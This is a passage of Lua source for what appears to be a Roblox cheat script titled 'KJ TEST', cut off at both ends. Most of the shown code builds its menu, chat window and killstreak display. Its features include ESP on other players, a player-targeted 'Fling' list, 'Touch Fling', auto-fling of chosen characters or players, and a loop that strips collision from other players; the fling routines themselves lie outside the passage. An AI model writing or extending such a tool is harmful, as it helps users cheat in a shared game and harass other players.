    b.BorderSizePixel=0; b.Text=initial and "ON" or "OFF"; b.TextColor3=Color3.new(1,1,1)
    b.Font=Enum.Font.GothamBold; b.TextSize=IS_MOBILE and 12 or 11; b.Parent=f; newCorner(b,6)
    local st=initial
    b.MouseButton1Click:Connect(function()
        st=not st
        TweenService:Create(b, TweenInfo.new(0.15), {BackgroundColor3 = st and Theme.success or Color3.fromRGB(60,60,80)}):Play()
        b.Text=st and "ON" or "OFF"
        if cb then cb(st) end
    end)
    return f
end

local function makeNumber(parent, text, initial, order, cb)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,INPUT_H); f.BackgroundColor3=Theme.bgCard
    f.BorderSizePixel=0; f.LayoutOrder=order; f.Parent=parent; newCorner(f,8)
    local l=Instance.new("TextLabel"); l.Size=UDim2.new(0.5,0,1,0); l.Position=UDim2.new(0,14,0,0)
    l.BackgroundTransparency=1; l.Text=text; l.TextColor3=Theme.text
    l.Font=Enum.Font.Gotham; l.TextSize=SMALL_FONT
    l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=f
    local b=Instance.new("TextBox"); b.Size=UDim2.new(0,110,0,INPUT_H-8); b.Position=UDim2.new(1,-122,0.5,-(INPUT_H-8)/2)
    b.BackgroundColor3=Theme.bgAlt; b.BorderSizePixel=0; b.Text=tostring(initial)
    b.TextColor3=Theme.text; b.Font=Enum.Font.GothamBold; b.TextSize=SMALL_FONT
    b.ClearTextOnFocus=false; b.Parent=f; newCorner(b,6)
    b.FocusLost:Connect(function()
        local n=tonumber(b.Text)
        if n then if cb then cb(n) end else b.Text=tostring(initial) end
    end)
    return f
end

local function makeColorInput(parent, text, initial, order, cb)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,INPUT_H); f.BackgroundColor3=Theme.bgCard
    f.BorderSizePixel=0; f.LayoutOrder=order; f.Parent=parent; newCorner(f,8)
    local l=Instance.new("TextLabel"); l.Size=UDim2.new(0.5,0,1,0); l.Position=UDim2.new(0,14,0,0)
    l.BackgroundTransparency=1; l.Text=text; l.TextColor3=Theme.text
    l.Font=Enum.Font.Gotham; l.TextSize=SMALL_FONT
    l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=f
    local pv=Instance.new("TextButton"); pv.Size=UDim2.new(0,34,0,INPUT_H-8); pv.Position=UDim2.new(1,-122,0.5,-(INPUT_H-8)/2)
    pv.BackgroundColor3=initial; pv.BorderSizePixel=0; pv.Text=""; pv.AutoButtonColor=false
    pv.Parent=f; newCorner(pv,6); newStroke(pv,Color3.fromRGB(150,150,180),1.5)
    local b=Instance.new("TextBox"); b.Size=UDim2.new(0,74,0,INPUT_H-8); b.Position=UDim2.new(1,-84,0.5,-(INPUT_H-8)/2)
    b.BackgroundColor3=Theme.bgAlt; b.BorderSizePixel=0; b.Text=colorToHex(initial)
    b.TextColor3=Theme.text; b.Font=Enum.Font.GothamBold; b.TextSize=11
    b.ClearTextOnFocus=false; b.Parent=f; newCorner(b,6)
    b.FocusLost:Connect(function()
        local c=hexToColor(b.Text)
        if c then pv.BackgroundColor3=c; b.Text=colorToHex(c); if cb then cb(c) end
        else b.Text=colorToHex(pv.BackgroundColor3) end
    end)
    pv.MouseButton1Click:Connect(function()
        openColorPicker(pv.BackgroundColor3, function(c)
            pv.BackgroundColor3=c; b.Text=colorToHex(c); if cb then cb(c) end
        end)
    end)
    return f
end

local function makeKeybind(parent, label, keyName, order)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,INPUT_H); f.BackgroundColor3=Theme.bgCard
    f.BorderSizePixel=0; f.LayoutOrder=order; f.Parent=parent; newCorner(f,8)
    local l=Instance.new("TextLabel"); l.Size=UDim2.new(0.6,0,1,0); l.Position=UDim2.new(0,14,0,0)
    l.BackgroundTransparency=1; l.Text=label; l.TextColor3=Theme.text
    l.Font=Enum.Font.Gotham; l.TextSize=SMALL_FONT
    l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=f
    local b=Instance.new("TextButton"); b.Size=UDim2.new(0,90,0,INPUT_H-8); b.Position=UDim2.new(1,-100,0.5,-(INPUT_H-8)/2)
    b.BackgroundColor3=Theme.bgAlt; b.BorderSizePixel=0
    b.Text=tostring(GlobalConfig.keybinds[keyName].Name); b.TextColor3=Theme.text
    b.Font=Enum.Font.GothamBold; b.TextSize=11; b.Parent=f; newCorner(b,6)
    b.MouseButton1Click:Connect(function()
        b.Text="..."
        local conn
        conn=UserInputService.InputBegan:Connect(function(inp, gp)
            if gp then return end
            GlobalConfig.keybinds[keyName]=inp.KeyCode
            b.Text=inp.KeyCode.Name; conn:Disconnect()
        end)
    end)
    return f
end

local function buildPlatform()
    local plat = Instance.new("Part")
    plat.Name = "KJ_Platform"
    plat.Size = Vector3.new(150, 2, 150)
    plat.Position = Vector3.new(0, 10, 0)
    plat.Anchored = true
    plat.CanCollide = true
    plat.Material = Enum.Material.Neon
    plat.Color = Color3.fromRGB(60, 90, 160)
    plat.Transparency = 0.3
    plat.Parent = workspace
end

local function buildChatIcon()
    local cg=Instance.new("ScreenGui"); cg.Name="KJChat"; cg.ResetOnSpawn=false
    cg.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; cg.IgnoreGuiInset=true
    cg.Parent=(gethui and gethui()) or LP:WaitForChild("PlayerGui")
    chatGuiRef=cg
    local iconSize = IS_MOBILE and 64 or 52
    local icon=Instance.new("TextButton"); icon.Name="ChatIcon"
    icon.Size=UDim2.new(0,iconSize,0,iconSize)
    icon.Position=UDim2.new(0,15, IS_MOBILE and 0.2 or 0.4, 0)
    icon.BackgroundColor3=Theme.bgCard; icon.BorderSizePixel=0
    icon.Text=""; icon.AutoButtonColor = false
    icon.Active=true; icon.Draggable=true; icon.Parent=cg
    newCorner(icon,14); newStroke(icon,Theme.accentDark,1.5)
    local iconEmoji = Instance.new("TextLabel")
    iconEmoji.Size = UDim2.new(1,0,1,0); iconEmoji.BackgroundTransparency = 1
    iconEmoji.Text = "C"; iconEmoji.TextColor3 = Theme.accent
    iconEmoji.Font = Enum.Font.GothamBold; iconEmoji.TextSize = IS_MOBILE and 28 or 24
    iconEmoji.Parent = icon
    chatIconRef = icon
    local winW = IS_MOBILE and math.min(workspace.CurrentCamera.ViewportSize.X - 20, 340) or 340
    local winH = IS_MOBILE and math.min(workspace.CurrentCamera.ViewportSize.Y - 100, 420) or 380
    local win=Instance.new("Frame"); win.Name="ChatWindow"
    win.Size=UDim2.new(0,winW,0,winH)
    win.Position=UDim2.new(0,80,0.4,0); win.BackgroundColor3=Theme.bg
    win.BorderSizePixel=0; win.Visible=false; win.Active=true; win.Draggable=true; win.Parent=cg
    newCorner(win,12); newStroke(win,Theme.accentDark,1.5); chatWindowRef=win
    local hdr=Instance.new("Frame"); hdr.Size=UDim2.new(1,0,0,36); hdr.BackgroundColor3=Theme.headerBg
    hdr.BorderSizePixel=0; hdr.Parent=win; newCorner(hdr,12)
    local tt=Instance.new("TextLabel"); tt.Size=UDim2.new(1,-40,1,0); tt.Position=UDim2.new(0,12,0,0)
    tt.BackgroundTransparency=1; tt.Text="Global Chat"; tt.TextColor3=Theme.text
    tt.Font=Enum.Font.GothamBold; tt.TextSize=14; tt.TextXAlignment=Enum.TextXAlignment.Left; tt.Parent=hdr
    local xb=Instance.new("TextButton"); xb.Size=UDim2.new(0,30,0,30); xb.Position=UDim2.new(1,-34,0,3)
    xb.BackgroundColor3=Theme.danger; xb.BorderSizePixel=0; xb.Text="x"
    xb.TextColor3=Color3.new(1,1,1); xb.Font=Enum.Font.GothamBold; xb.TextSize=14; xb.Parent=hdr; newCorner(xb,6)
    xb.MouseButton1Click:Connect(function() win.Visible=false end)
    local content=Instance.new("ScrollingFrame"); content.Size=UDim2.new(1,-16,1,-110)
    content.Position=UDim2.new(0,8,0,44); content.BackgroundTransparency=1
    content.BorderSizePixel=0; content.ScrollBarThickness=4
    content.ScrollBarImageColor3=Theme.accentDark; content.CanvasSize=UDim2.new(0,0,0,0)
    content.AutomaticCanvasSize=Enum.AutomaticSize.Y; content.Parent=win
    chatContentRef=content
    local ll=Instance.new("UIListLayout"); ll.Padding=UDim.new(0,4)
    ll.SortOrder=Enum.SortOrder.LayoutOrder; ll.Parent=content
    local inp=Instance.new("TextBox"); inp.Size=UDim2.new(1,-100,0,IS_MOBILE and 40 or 32)
    inp.Position=UDim2.new(0,8,1,-(IS_MOBILE and 48 or 40))
    inp.BackgroundColor3=Theme.bgCard; inp.BorderSizePixel=0; inp.Text=""
    inp.PlaceholderText="Message..."; inp.TextColor3=Theme.text
    inp.Font=Enum.Font.Gotham; inp.TextSize=12; inp.ClearTextOnFocus=false; inp.Parent=win
    newCorner(inp,7)
    local send=Instance.new("TextButton"); send.Size=UDim2.new(0,80,0,IS_MOBILE and 40 or 32)
    send.Position=UDim2.new(1,-88,1,-(IS_MOBILE and 48 or 40))
    send.BackgroundColor3=Theme.success; send.BorderSizePixel=0; send.Text="Send"
    send.TextColor3=Color3.new(1,1,1); send.Font=Enum.Font.GothamBold; send.TextSize=12
    send.Parent=win; newCorner(send,7)
    send.MouseButton1Click:Connect(function()
        local m=inp.Text
        if m and m~="" then inp.Text=""; chatSend(m) end
    end)
    task.spawn(function()
        local rendered=0
        while cg.Parent do
            task.wait(0.5)
            if content and win.Visible then
                local now=#chatMessages
                if now~=rendered then
                    for _,ch in ipairs(content:GetChildren()) do
                        if ch:IsA("TextLabel") or ch:IsA("Frame") then ch:Destroy() end
                    end
                    for i,m in ipairs(chatMessages) do
                        local f=Instance.new("Frame"); f.Size=UDim2.new(1,0,0,0)
                        f.AutomaticSize=Enum.AutomaticSize.Y
                        f.BackgroundColor3=m.self and Color3.fromRGB(30,50,40) or Theme.bgCard
                        f.BorderSizePixel=0; f.LayoutOrder=i; f.Parent=content; newCorner(f,6)
                        local txt=Instance.new("TextLabel"); txt.Size=UDim2.new(1,-12,0,0)
                        txt.AutomaticSize=Enum.AutomaticSize.Y
                        txt.Position=UDim2.new(0,6,0,4); txt.BackgroundTransparency=1
                        txt.Text="["..(m.user or "?").."]: "..(m.text or "")
                        txt.TextColor3=m.self and Color3.fromRGB(180,255,200) or Theme.text
                        txt.Font=Enum.Font.Gotham; txt.TextSize=12
                        txt.TextXAlignment=Enum.TextXAlignment.Left; txt.TextWrapped=true; txt.Parent=f
                    end
                    rendered=now
                end
            end
        end
    end)
    icon.MouseButton1Click:Connect(function() win.Visible=not win.Visible end)
    task.spawn(function()
        task.wait(6)
        if not chatOk and chatIconRef then
            chatIconRef.Visible = false
            if chatWindowRef then chatWindowRef.Visible = false end
        end
    end)
end

local function buildReturnBtn()
    local rGui=Instance.new("ScreenGui"); rGui.Name="KJ_ReturnBtn"
    rGui.ResetOnSpawn=false; rGui.IgnoreGuiInset=true
    rGui.Parent=(gethui and gethui()) or LP:WaitForChild("PlayerGui")
    local btnSize = IS_MOBILE and 62 or 56
    local b=Instance.new("TextButton"); b.Size=UDim2.new(0,btnSize,0,btnSize)
    b.Position=UDim2.new(1,-(btnSize+20),0.5,-btnSize/2)
    b.BackgroundColor3=Theme.accentDark; b.BackgroundTransparency=0.1
    b.BorderSizePixel=0; b.Text="H"; b.TextColor3=Color3.new(1,1,1)
    b.Font=Enum.Font.GothamBold; b.TextSize=22; b.Active=true; b.Draggable=true
    b.Parent=rGui
    newCorner(b,btnSize/2)
    local s=Instance.new("UIStroke"); s.Color=Theme.accent; s.Thickness=1.5; s.Parent=b
    b.MouseButton1Click:Connect(function()
        local hum=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
        if hum then workspace.CurrentCamera.CameraSubject=hum end
        notify("Camera → me", Theme.success)
    end)
end

local function buildKillstreak()
    local g = Instance.new("ScreenGui")
    g.Name = "KJ_Killstreak"
    g.ResetOnSpawn = false
    g.IgnoreGuiInset = true
    g.Parent = (gethui and gethui()) or LP:WaitForChild("PlayerGui")

    killstreakLabel = Instance.new("TextLabel")
    killstreakLabel.Size = UDim2.new(0, 220, 0, 32)
    killstreakLabel.Position = UDim2.new(1, -20, 1, -60)
    killstreakLabel.AnchorPoint = Vector2.new(1, 1)
    killstreakLabel.BackgroundTransparency = 1
    killstreakLabel.Text = ""
    killstreakLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    killstreakLabel.TextStrokeTransparency = 0
    killstreakLabel.TextStrokeColor3 = Color3.new(0,0,0)
    killstreakLabel.Font = Enum.Font.GothamBold
    killstreakLabel.TextSize = 20
    killstreakLabel.TextXAlignment = Enum.TextXAlignment.Right
    killstreakLabel.Visible = false
    killstreakLabel.Parent = g

    task.spawn(function()
        while true do
            task.wait(0.3)
            local ls = LP:FindFirstChild("leaderstats")
            if ls then
                local k = ls:FindFirstChild("Kills")
                if k and k:IsA("IntValue") then
                    if lastKills == nil then
                        lastKills = k.Value
                    elseif k.Value > lastKills then
                        killstreak = killstreak + (k.Value - lastKills)
                        lastKills = k.Value
                        if killstreakLabel then
                            killstreakLabel.Text = "killstreak: " .. tostring(killstreak)
                            killstreakLabel.Visible = true
                        end
                    elseif k.Value < lastKills then
                        lastKills = k.Value
                    end
                end
            end
        end
    end)

    LP.CharacterAdded:Connect(function()
        killstreak = 0
        task.wait(1.5)
        if killstreakLabel then
            killstreakLabel.Text = ""
            killstreakLabel.Visible = false
        end
    end)
end

local function buildGUI()
    screenGui=Instance.new("ScreenGui"); screenGui.Name="KJTestV9"
    screenGui.ResetOnSpawn=false; screenGui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling
    screenGui.IgnoreGuiInset=true
    screenGui.Parent=(gethui and gethui()) or LP:WaitForChild("PlayerGui")
    setupNotifications(screenGui)

    local vp = workspace.CurrentCamera.ViewportSize
    local mainW = IS_MOBILE and math.min(vp.X - 10, 400) or 440
    local mainH = IS_MOBILE and math.min(vp.Y - 60, 600) or 660

    local main=Instance.new("Frame"); main.Name="Main"
    main.Size=UDim2.new(0,mainW,0,mainH)
    main.Position=UDim2.new(0, IS_MOBILE and 5 or 30, 0, IS_MOBILE and 40 or 80)
    main.BackgroundColor3=Theme.bg; main.BorderSizePixel=0
    main.Active=true; main.Draggable=true; main.ClipsDescendants=true
    main.Parent=screenGui; newCorner(main,16); newStroke(main,Theme.accentDark,1.5)

    local hdrH = IS_MOBILE and 54 or 48
    local hdr=Instance.new("Frame"); hdr.Size=UDim2.new(1,0,0,hdrH)
    hdr.BackgroundColor3=Theme.headerBg; hdr.BorderSizePixel=0
    hdr.ClipsDescendants=true; hdr.Parent=main; newCorner(hdr,16)
    local hg=Instance.new("UIGradient"); hg.Color=ColorSequence.new{
        ColorSequenceKeypoint.new(0, Color3.fromRGB(50,50,75)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(28,28,42))}; hg.Rotation=25; hg.Parent=hdr
    local hm=Instance.new("Frame"); hm.Size=UDim2.new(1,0,0,10); hm.Position=UDim2.new(0,0,1,-10)
    hm.BackgroundColor3=Theme.bg; hm.BorderSizePixel=0; hm.ZIndex=1; hm.Parent=hdr
    local iconSize = IS_MOBILE and 42 or 38
    local icon=Instance.new("TextLabel"); icon.Size=UDim2.new(0,iconSize,0,iconSize); icon.Position=UDim2.new(0,8,0.5,-iconSize/2)
    icon.BackgroundColor3=Theme.accentDark; icon.BorderSizePixel=0
    icon.Text="KJ"; icon.TextColor3=Color3.new(1,1,1); icon.Font=Enum.Font.GothamBold
    icon.TextSize=IS_MOBILE and 15 or 14; icon.ZIndex=2; icon.Parent=hdr; newCorner(icon,10)
    local title=Instance.new("TextLabel"); title.Size=UDim2.new(1,-200,0,20); title.Position=UDim2.new(0, iconSize + 16, 0, 6)
    title.BackgroundTransparency=1; title.Text="KJ TEST"; title.TextColor3=Theme.text
    title.Font=Enum.Font.GothamBold; title.TextSize=IS_MOBILE and 16 or 15; title.TextXAlignment=Enum.TextXAlignment.Left
    title.ZIndex=2; title.Parent=hdr
    local sub=Instance.new("TextLabel"); sub.Size=UDim2.new(1,-200,0,14); sub.Position=UDim2.new(0, iconSize + 16, 0, 26)
    sub.BackgroundTransparency=1; sub.Text="X: -  Y: -  Z: -"; sub.TextColor3=Theme.textDim
    sub.Font=Enum.Font.Gotham; sub.TextSize=IS_MOBILE and 12 or 11; sub.TextXAlignment=Enum.TextXAlignment.Left
    sub.ZIndex=2; sub.Parent=hdr; subtitleRef=sub
    local minBtn=Instance.new("TextButton"); minBtn.Size=UDim2.new(0,30,0,26); minBtn.Position=UDim2.new(1,-40,0.5,-13)
    minBtn.BackgroundColor3=Theme.bgCard; minBtn.BorderSizePixel=0; minBtn.Text="-"
    minBtn.TextColor3=Theme.text; minBtn.Font=Enum.Font.GothamBold; minBtn.TextSize=14
    minBtn.ZIndex=2; minBtn.Parent=hdr; newCorner(minBtn,6)

    local tabsH = IS_MOBILE and 42 or 36
    local tabsFrame=Instance.new("Frame"); tabsFrame.Size=UDim2.new(1,-20,0,tabsH)
    tabsFrame.Position=UDim2.new(0,10,0,hdrH+8); tabsFrame.BackgroundColor3=Theme.tabBg
    tabsFrame.BorderSizePixel=0; tabsFrame.Parent=main; newCorner(tabsFrame,10)
    local tl=Instance.new("UIListLayout"); tl.FillDirection=Enum.FillDirection.Horizontal
    tl.Padding=UDim.new(0,3); tl.VerticalAlignment=Enum.VerticalAlignment.Center; tl.Parent=tabsFrame
    local tp=Instance.new("UIPadding"); tp.PaddingLeft=UDim.new(0,5); tp.PaddingRight=UDim.new(0,5)
    tp.PaddingTop=UDim.new(0,5); tp.PaddingBottom=UDim.new(0,5); tp.Parent=tabsFrame
    local content=Instance.new("Frame"); content.Size=UDim2.new(1,-20,1,-(hdrH+tabsH+26))
    content.Position=UDim2.new(0,10,0,hdrH+tabsH+18); content.BackgroundTransparency=1; content.Parent=main
    local pages, tabBtns, currentPage = {}, {}, nil
    local function switchPage(n)
        for k,p in pairs(pages) do p.Visible=(k==n) end
        currentPage=n
        for n2,b in pairs(tabBtns) do
            if n2==n then
                TweenService:Create(b,TweenInfo.new(0.2, Enum.EasingStyle.Quad),{BackgroundColor3=Theme.tabActive}):Play()
                b.TextColor3=Color3.new(1,1,1)
            else
                TweenService:Create(b,TweenInfo.new(0.2, Enum.EasingStyle.Quad),{BackgroundColor3=Theme.bgCard}):Play()
                b.TextColor3=Theme.textDim
            end
        end
    end
    local function makeTab(name, label)
        local b=Instance.new("TextButton"); b.Name=name; b.Size=UDim2.new(0, IS_MOBILE and 46 or 60, 1, 0)
        b.BackgroundColor3=Theme.bgCard; b.BorderSizePixel=0; b.Text=label
        b.TextColor3=Theme.textDim; b.Font=Enum.Font.GothamBold; b.TextSize=IS_MOBILE and 13 or 12
        b.Parent=tabsFrame; newCorner(b,8); tabBtns[name]=b
        local p=Instance.new("ScrollingFrame"); p.Name=name; p.Size=UDim2.new(1,0,1,0)
        p.BackgroundTransparency=1; p.BorderSizePixel=0; p.ScrollBarThickness=4
        p.ScrollBarImageColor3=Theme.accentDark; p.CanvasSize=UDim2.new(0,0,0,0)
        p.AutomaticCanvasSize=Enum.AutomaticSize.Y; p.Visible=false; p.Parent=content
        local ll=Instance.new("UIListLayout"); ll.Padding=UDim.new(0,7)
        ll.SortOrder=Enum.SortOrder.LayoutOrder; ll.Parent=p
        local pd=Instance.new("UIPadding"); pd.PaddingLeft=UDim.new(0,6); pd.PaddingRight=UDim.new(0,6)
        pd.PaddingTop=UDim.new(0,6); pd.PaddingBottom=UDim.new(0,6); pd.Parent=p
        pages[name]=p; b.MouseButton1Click:Connect(function() switchPage(name) end)
        return p
    end

    local globalPage=makeTab("global", "G")
    local charsPage=makeTab("chars", "C")
    local playersPage=makeTab("players", "P")
    local movementPage=makeTab("movement", "M")
    local configsPage=makeTab("configs", "S")
    local authorsPage=makeTab("authors", "A")

    local o=0; local function nO() o=o+1; return o end

    makeSection(globalPage, "Общие", nO())
    makeNumber(globalPage, "Кулдаун ТП", GlobalConfig.cooldown, nO(), function(v) GlobalConfig.cooldown=v end)
    makeToggle(globalPage, "Звук", GlobalConfig.soundAlert, nO(), function(v) GlobalConfig.soundAlert=v end)
    makeToggle(globalPage, "Уведомления", GlobalConfig.notifications, nO(), function(v) GlobalConfig.notifications=v end)
    makeToggle(globalPage, "Пульс ульты", GlobalConfig.pulseUlt, nO(), function(v) GlobalConfig.pulseUlt=v end)

    makeSection(globalPage, "Переключатели", nO())
    makeToggle(globalPage, "Скрыть HP", GlobalConfig.hideAllHp, nO(), function(v) GlobalConfig.hideAllHp=v end)
    makeToggle(globalPage, "Скрыть имена", GlobalConfig.hideAllNames, nO(), function(v) GlobalConfig.hideAllNames=v end)
    makeToggle(globalPage, "ESP", GlobalConfig.espEnabled, nO(), function(v)
        GlobalConfig.espEnabled=v
        if not v then removeAllHighlights() end
        notify(v and "ESP ON" or "ESP OFF", v and Theme.success or Theme.danger)
    end)
    makeToggle(globalPage, "Полоска ульты над игроками", GlobalConfig.showUltBar, nO(), function(v) GlobalConfig.showUltBar=v end)
    makeNumber(globalPage, "Время показа имён", GlobalConfig.nameShowDuration, nO(), function(v) GlobalConfig.nameShowDuration=v end)

    makeSection(globalPage, "Действия", nO())
    local showAllBtn=Instance.new("TextButton"); showAllBtn.Size=UDim2.new(1,0,0,BTN_H+2)
    showAllBtn.BackgroundColor3=Theme.accentDark; showAllBtn.BorderSizePixel=0
    showAllBtn.Text="Показать имена"; showAllBtn.TextColor3=Color3.new(1,1,1)
    showAllBtn.Font=Enum.Font.GothamBold; showAllBtn.TextSize=BIG_FONT
    showAllBtn.LayoutOrder=nO(); showAllBtn.Parent=globalPage; newCorner(showAllBtn,8)
    local showCD=false
    showAllBtn.MouseButton1Click:Connect(function()
        if showCD then return end
        showCD=true; GlobalConfig.forceShowAllUntil=tick()+GlobalConfig.nameShowDuration
        notify("Имена показаны", Theme.accent)
        for plr in pairs(tracked) do
            local info=playerData[plr]
            updateNameLabel(plr, info and info.charKey, info and info.form)
        end
        task.spawn(function()
            for i=math.floor(GlobalConfig.nameShowDuration),1,-1 do
                showAllBtn.Text="..." .. i .. "s"; task.wait(1)
            end
            showAllBtn.Text="Показать имена"; showCD=false
        end)
    end)

    makeSection(globalPage, "Fling", nO())
    makeNumber(globalPage, "Сколько раз флингануть", GlobalConfig.flingCount, nO(), function(v) GlobalConfig.flingCount=v end)
    local flingStartBtn=Instance.new("TextButton"); flingStartBtn.Size=UDim2.new(1,0,0,BTN_H)
    flingStartBtn.BackgroundColor3=Theme.success; flingStartBtn.BorderSizePixel=0
    flingStartBtn.Text="Fling"; flingStartBtn.TextColor3=Color3.new(1,1,1)
    flingStartBtn.Font=Enum.Font.GothamBold; flingStartBtn.TextSize=BIG_FONT
    flingStartBtn.LayoutOrder=nO(); flingStartBtn.Parent=globalPage; newCorner(flingStartBtn,8)
    flingStartBtn.MouseButton1Click:Connect(function()
        if next(FlingTargets) then startFlinging(); notify("Fling", Theme.success) end
    end)
    local flingStopBtn=Instance.new("TextButton"); flingStopBtn.Size=UDim2.new(1,0,0,BTN_H)
    flingStopBtn.BackgroundColor3=Theme.danger; flingStopBtn.BorderSizePixel=0
    flingStopBtn.Text="Stop"; flingStopBtn.TextColor3=Color3.new(1,1,1)
    flingStopBtn.Font=Enum.Font.GothamBold; flingStopBtn.TextSize=BIG_FONT
    flingStopBtn.LayoutOrder=nO(); flingStopBtn.Parent=globalPage; newCorner(flingStopBtn,8)
    flingStopBtn.MouseButton1Click:Connect(function() stopFlinging(); notify("Stopped", Theme.danger) end)

    local tfBtn=Instance.new("TextButton"); tfBtn.Size=UDim2.new(1,0,0,BTN_H)
    tfBtn.BackgroundColor3=Color3.fromRGB(100,60,180); tfBtn.BorderSizePixel=0
    tfBtn.Text="Touch Fling: "..(touchFlingActive and "ON" or "OFF")
    tfBtn.TextColor3=Color3.new(1,1,1); tfBtn.Font=Enum.Font.GothamBold
    tfBtn.TextSize=BIG_FONT; tfBtn.LayoutOrder=nO(); tfBtn.Parent=globalPage; newCorner(tfBtn,8)
    tfBtn.MouseButton1Click:Connect(function()
        if touchFlingActive then stopTouchFling() else startTouchFling() end
        tfBtn.Text="Touch Fling: "..(touchFlingActive and "ON" or "OFF")
    end)

    makeSection(globalPage, "Fling List", nO())
    local flingListHolder=Instance.new("Frame"); flingListHolder.Size=UDim2.new(1,0,0,0)
    flingListHolder.AutomaticSize=Enum.AutomaticSize.Y; flingListHolder.BackgroundTransparency=1
    flingListHolder.LayoutOrder=nO(); flingListHolder.Parent=globalPage
    local flh=Instance.new("UIListLayout"); flh.Padding=UDim.new(0,4)
    flh.SortOrder=Enum.SortOrder.LayoutOrder; flh.Parent=flingListHolder
    local flingRows = {}

    local function ensureFlingRow(plr)
        if flingRows[plr] then return flingRows[plr] end
        local row = Instance.new("Frame"); row.Size=UDim2.new(1,0,0,36)
        row.BackgroundColor3=Theme.bgCard; row.BorderSizePixel=0
        row.Parent=flingListHolder; newCorner(row,8)
        local lbl = Instance.new("TextLabel"); lbl.Size=UDim2.new(1,-50,1,0); lbl.Position=UDim2.new(0,10,0,0)
        lbl.BackgroundTransparency=1; lbl.Text=plr.Name; lbl.TextColor3=Theme.text
        lbl.Font=Enum.Font.Gotham; lbl.TextSize=SMALL_FONT
        lbl.TextXAlignment=Enum.TextXAlignment.Left; lbl.Parent=row
        local chk = Instance.new("TextButton"); chk.Size=UDim2.new(0,32,0,28)
        chk.Position=UDim2.new(1,-40,0.5,-14)
        chk.BackgroundColor3=GlobalConfig.flingSelected[plr.Name] and Theme.success or Color3.fromRGB(60,60,80)
        chk.BorderSizePixel=0; chk.Text=GlobalConfig.flingSelected[plr.Name] and "V" or ""
        chk.TextColor3=Color3.new(1,1,1); chk.Font=Enum.Font.GothamBold; chk.TextSize=14
        chk.Parent=row; newCorner(chk,6)
        chk.MouseButton1Click:Connect(function()
            GlobalConfig.flingSelected[plr.Name]=not GlobalConfig.flingSelected[plr.Name]
            if GlobalConfig.flingSelected[plr.Name] then
                chk.BackgroundColor3=Theme.success; chk.Text="V"; FlingTargets[plr.Name]=plr
            else
                chk.BackgroundColor3=Color3.fromRGB(60,60,80); chk.Text=""; FlingTargets[plr.Name]=nil
            end
        end)
        flingRows[plr] = {row=row, chk=chk}
        return flingRows[plr]
    end

    task.spawn(function()
        while screenGui and screenGui.Parent do
            task.wait(1)
            for plr,e in pairs(flingRows) do
                if not plr.Parent then e.row:Destroy(); flingRows[plr]=nil end
            end
            for plr in pairs(tracked) do ensureFlingRow(plr) end
        end
    end)

    makeSection(globalPage, "Anti-Fling", nO())

    local noCollideConn = nil
    local function toggleNoPlayerCollide(enable)
        if noCollideConn then noCollideConn:Disconnect(); noCollideConn = nil end
        if not enable then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character then
                    for _, part in ipairs(plr.Character:GetDescendants()) do
                        if part:IsA("BasePart") then
                            pcall(function() part.CanCollide = true end)
                        end
                    end
                end
            end
            notify("Collide ON", Theme.success); return
        end
        local function apply(char)
            if not char then return end
            for _, part in ipairs(char:GetDescendants()) do
                if part:IsA("BasePart") then
                    pcall(function() part.CanCollide = false end)
                end
            end
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                apply(plr.Character)
                plr.CharacterAdded:Connect(function(c)
                    task.wait(0.5); if noCollideConn then apply(c) end
                end)
            end
        end
        noCollideConn = RunService.Heartbeat:Connect(function()
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character then
                    for _, part in ipairs(plr.Character:GetDescendants()) do
                        if part:IsA("BasePart") and part.CanCollide then
                            pcall(function() part.CanCollide = false end)
                        end
                    end
                end
            end
        end)
        notify("Collide OFF", Theme.danger)
    end
    makeToggle(globalPage, "No Player Collide", false, nO(), function(v) toggleNoPlayerCollide(v) end)

    makeSection(globalPage, "Авто-флинг", nO())
    local autoBox=Instance.new("TextBox"); autoBox.Size=UDim2.new(1,0,0,INPUT_H)
    autoBox.BackgroundColor3=Theme.bgCard; autoBox.BorderSizePixel=0
    autoBox.Text=GlobalConfig.autoFlingChar; autoBox.PlaceholderText="Saitama / PlayerName"
    autoBox.TextColor3=Theme.text; autoBox.Font=Enum.Font.GothamBold; autoBox.TextSize=SMALL_FONT
    autoBox.ClearTextOnFocus=false; autoBox.LayoutOrder=nO(); autoBox.Parent=globalPage; newCorner(autoBox,8)
    local autoSuggest = Instance.new("Frame"); autoSuggest.Size = UDim2.new(1,0,0,0)
    autoSuggest.AutomaticSize = Enum.AutomaticSize.Y; autoSuggest.BackgroundColor3 = Theme.bgAlt
    autoSuggest.BorderSizePixel = 0; autoSuggest.Visible = false
    autoSuggest.LayoutOrder = nO(); autoSuggest.Parent = globalPage; newCorner(autoSuggest,8)
    local asl = Instance.new("UIListLayout"); asl.Padding = UDim.new(0,2); asl.Parent = autoSuggest
    local function clearAutoSuggest()
        for _, c in ipairs(autoSuggest:GetChildren()) do
            if c:IsA("TextButton") then c:Destroy() end
        end
    end
    autoBox:GetPropertyChangedSignal("Text"):Connect(function()
        local text = autoBox.Text:lower()
        clearAutoSuggest()
        if text == "" then autoSuggest.Visible = false; return end
        local shown = 0
        for key, d in pairs(Characters) do
            local nm = (d.name[CurrentLang] or d.name.en):lower()
            if nm:sub(1, #text) == text or key:lower():sub(1, #text) == text then
                local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,0,26)
                btn.BackgroundColor3 = Theme.bg; btn.BorderSizePixel = 0
                btn.Text = key
                btn.TextColor3 = Theme.text; btn.Font = Enum.Font.Gotham
                btn.TextSize = 11; btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = autoSuggest; newCorner(btn,4)
                btn.MouseButton1Click:Connect(function()
                    GlobalConfig.autoFlingChar = key; autoBox.Text = key
                    clearAutoSuggest(); autoSuggest.Visible = false
                end)
                shown = shown + 1
